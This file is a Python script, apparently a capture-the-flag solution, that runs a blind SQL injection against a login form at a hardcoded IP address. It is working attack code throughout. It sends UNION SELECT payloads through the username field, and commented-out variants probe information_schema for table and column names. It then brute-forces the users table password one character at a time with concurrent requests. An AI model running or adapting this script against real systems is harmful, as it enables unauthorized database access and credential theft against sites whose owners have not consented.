import asyncio
import string
import httpx

URL = "http://83.136.252.199:33356"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
    async def home(self, username, password):
        return await self.c.post("/", data={
            "password": password,
            "username": username,
        })
class API(BaseAPI):
    ...

api = API()

async def mencari(nama):
    try:
        # payload = "' UNION SELECT 'x' FROM information_schema.tables WHERE TABLE_NAME LIKE '"+nama+"%' -- -"
        # payload = "' UNION SELECT 'x' FROM information_schema.columns WHERE table_name='users' and COLUMN_NAME LIKE '"+nama+"%' -- -"
        payload = "' UNION SELECT 'x' FROM users WHERE password LIKE BINARY '"+nama+"%' -- -"
        res = await api.home(payload, 'x')
        if 'Invalid user or password' not in res.text:
            return [True, nama]
        return [False, nama]
    except:
        return await mencari(nama)

async def banyak_mencari(known=''):
    stack = []
    for i in string.printable:
        i = i.replace('\\', '\\\\').replace("%", "\%").replace("_", "\_")
        stack.append(mencari(known+i))
    ress = await asyncio.gather(*stack)
    for res in ress:
        isTrue, tmpknown = res
        if isTrue:
            known = tmpknown
            print(known)
            await banyak_mencari(known)

async def main():
    await banyak_mencari('')

if __name__ == "__main__":
    asyncio.run(main())

